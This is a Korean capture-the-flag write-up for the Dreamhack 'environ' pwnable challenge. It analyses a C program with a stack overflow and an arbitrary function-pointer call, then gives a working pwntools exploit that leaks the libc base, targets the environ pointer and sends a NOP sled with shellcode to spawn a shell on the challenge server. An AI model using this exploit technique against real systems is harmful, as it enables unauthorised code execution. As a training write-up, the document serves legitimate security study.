Dreamhack environ writeup
==============


## 1. 코드 분석

```python
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}


int main()
{
    char buf[16];
    size_t size;
    long value;
    void (*jump)();

    initialize();

    printf("stdout: %p\n", stdout)
    printf("Size: ");
    scanf("%ld", &size);
    printf("Data: ");
    read(0, buf, size);

    printf("*jmp=");
    scanf("%ld", &value);

    jump = *(long *)value;
    jump();

    return 0;

}
```

이 코드에서 스택 버퍼 오버플로를 발견할 수 있다. 

```c
char buf[16];
...
printf("Size: ");
scanf("%ld", &size);
printf("Data: ");
read(0, buf, size);

```

* `buf`는 **16바이트** 크기의 배열입
* 하지만 `size`를 사용자로부터 직접 입력받아 `read` 함수에 사용
* 만약 `size`에 16보다 큰 값을 넣으면 `buf`를 넘어 스택의 다른 데이터(함수 포인터 `jump`, 리턴 주소 등)를 덮어쓸 수 있음    

또 다른 취약점은 임의 주소 실행이다. 

```c
printf("*jmp=");
scanf("%ld", &value);
jump = *(long *)value;
jump();

```

* 사용자가 입력한 `value`를 메모리 주소로 해석하고 그 주소에 들어있는 값을 읽어와 함수처럼 호출



## 2. 익스플로잇 시나리오


* Libc 라이브러리 안에는 environ이라는 전역 변수가 정의되어 있다.   
environ 변수: 현재 프로세스의 환경 변수들이 저장된 스택의 주소를 가리키고 있다.     
즉 &environ (Libc 내 주소)을 알면 그 안에 적힌 값(environ)을 읽어와서 스택의 실제 주소를 알아낼 수 있는 것

```c
jump = *(long *)value;
jump();
```

여기서 value에 사용자가 입력한 주소가 들어가고 그 주소가 가리키는 값을 함수 주소로 삼아 실행합

만약 value에 &environ 주소를 넣는다면?   
jump는 *(&environ), 즉 environ 값(스택 주소)이 되어 프로그램은 environ이 가리키는 스택 지점을 실행하게 된다. 이렇게 되면

1. Libc Base 및 environ 주소 계산
2. 스택 오프셋 확인 (디버깅)

해서 알아낼 수있다. 

## 3. 익스플로잇 코드

```python
from pwn import *

p = remote("host3.dreamhack.games", 20000) 
e = ELF("./environ")
libc = ELF("./libc.so.6")

# 2. Libc Base Leak
p.recvuntil(b"stdout: ")
stdout_addr = int(p.recvline(), 16)

# stdout 주소에서 라이브러리 내 stdout 오프셋을 빼서 base를 구함
libc_base = stdout_addr - libc.symbols['_IO_2_1_stdout_']
# jump의 value로 넘겨줄 &environ 주소 계산
environ_ptr_addr = libc_base + libc.symbols['environ']

log.info(f"Libc Base: {hex(libc_base)}")
log.info(f"&environ: {hex(environ_ptr_addr)}")

# 3. Stack Leak 우회 및 Shellcode 배치
shellcode = asm(shellcraft.sh())
payload = b"\x90" * 118 + shellcode 

# 4. 데이터 전송
p.sendlineafter(b"Size: ", str(len(payload)).encode())
p.sendafter(b"Data: ", payload)

# 5. Jump 실행
p.sendlineafter(b"*jmp=", str(environ_ptr_addr).encode())

# 6. 쉘 획득
p.interactive()
```


## 4. 실행 결과



<img width="433" height="86" alt="image" src="https://github.com/user-attachments/assets/fd7ecd63-4c8f-4e65-b44e-fd67b1f63bd8" />
